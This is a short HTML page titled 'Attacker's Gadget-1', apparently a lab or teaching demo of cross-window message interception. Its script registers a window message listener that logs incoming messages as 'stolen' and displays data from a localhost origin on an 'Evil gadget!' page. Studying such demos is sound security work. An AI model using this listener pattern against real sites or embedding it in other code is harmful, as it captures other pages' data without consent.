<!DOCTYPE html>
<html>
<head>
<title>Attacker's Gadget-1</title>
<script language="javascript">
    window.onload = function () {
        //code for stealing messages.
        window.onmessage = function (e) {
            console.log('e stolen: ', e);
            if (e.origin == 'http://localhost') {
                document.getElementById("stolenData").innerHTML = e.data;
            }
        };
    }
</script>
</head>

<body>
<h3> Evil gadget!</h3>
<p>Stolen data:</p>
<p id="stolenData"></p>
</body>
</html>
